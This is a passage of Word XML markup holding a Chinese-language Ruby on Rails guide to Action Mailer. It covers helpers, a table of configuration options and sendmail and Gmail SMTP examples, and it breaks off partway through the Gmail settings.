          <w:p w14:paraId="2E98CB9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36C7216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1059DD3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62893F0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5CE07376"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4 使用 Action Mailer Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BA691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Action Mailer 现在集成自一个抽象的 Controller 类，你可以调用 Action Controller 的通用 Helper .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5F1895"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5 Action Mailer 设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3EFBE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以下配置可以在你的环境配置文件 (environment.rb, production.rb…) 中被找到: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5801"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="52D144DB" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="415366E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template_root</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="379E668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Determines the base from which template references will be made.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4368EAB8" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="414B554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logger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02138F3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Generates information on the mailing run if available. Can be set to </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>nil</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> for no logging. Compatible with both Ruby’s own </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Logger</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Log4r</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> loggers.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6CC3B2DF" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B017D3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smtp_settings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="732DBF2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Allows detailed configuration for </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:smtp</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> delivery method:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D0B5E5D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="271"/>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:address</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> – Allows you to use a remote mail server. Just change it from its default “localhost” setting.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="782FE0EF" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="271"/>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:port</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> – On the off chance that your mail server doesn’t run on port 25, you can change it.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FD53825" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="271"/>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:domain</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> – If you need to specify a HELO domain, you can do it here.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11D7BF15" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="271"/>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:user_name</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> – If your mail server requires authentication, set the username in this setting.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CCA41BA" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="271"/>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:password</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> – If your mail server requires authentication, set the password in this setting.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16483FC9" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="271"/>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:authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> – If your mail server requires authentication, you need to specify the authentication type here. This is a symbol and one of </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:plain</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:login</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:cram_md5</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="00776A23" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2AB1FF5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sendmail_settings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="099D567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Allows you to override options for the </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:sendmail</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> delivery method.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="740BE7DA" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="272"/>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:location</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> – The location of the sendmail executable. Defaults to </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>/usr/sbin/sendmail</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07CA8C5C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="272"/>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:arguments</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> – The command line arguments to be passed to sendmail. Defaults to </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>-i -t</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1A17C23B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="002F637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raise_delivery_errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35084A5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Whether or not errors should be raised if the email fails to be delivered.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4D4041B6" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C83135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delivery_method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B8AF75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Defines a delivery method. Possible values are </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:smtp</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> (default), </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:sendmail</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:file</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:test</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6B45E16F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3525D37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perform_deliveries</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="072D2DE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Determines whether deliveries are actually carried out when the </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>deliver</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> method is invoked on the Mail message. By default they are, but this can be turned off to help functional testing.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="436C37D4" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72E6513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deliveries</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08C6886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Keeps an array of all the emails sent out through the Action Mailer with delivery_method :test. Most useful for unit and functional testing.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29A69A61"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5.1 Action Mailer 配置范例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777D575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你可以在你的 环境配置文件(</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/environments/$RAILS_ENV.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)中做出如下配置</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="26D7DBED" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E8BEE0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config.action_mailer.delivery_method = :sendmail</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7938864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Defaults to:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0884EB1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config.action_mailer.sendmail_settings = {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E3B0D3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:location =&gt; '/usr/sbin/sendmail',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A77FF7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:arguments =&gt; '-i -t'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="188FEFC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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64EDF7E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config.action_mailer.perform_deliveries = true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="184B967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config.action_mailer.raise_delivery_errors = true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="421CC945"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5.2 Action Mailer 和 GMail</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6562426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因为 Action Mailer 现在使用 Mail gem，所以把你的 Action Mailer 和 一个Gmail绑定变得轻而易举。你 需要把设定写入你的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/environments/$RAILS_ENV.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0FF735F2" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="059AE15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config.action_mailer.delivery_method = :smtp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21C43BC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config.action_mailer.smtp_settings = {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0035DAF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:address</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">              </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "smtp.gmail.com",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D1F27B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:port</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">                 </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 587,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F43E22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:domain</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">               </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'baci.lindsaar.net',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A48341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:user_name</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
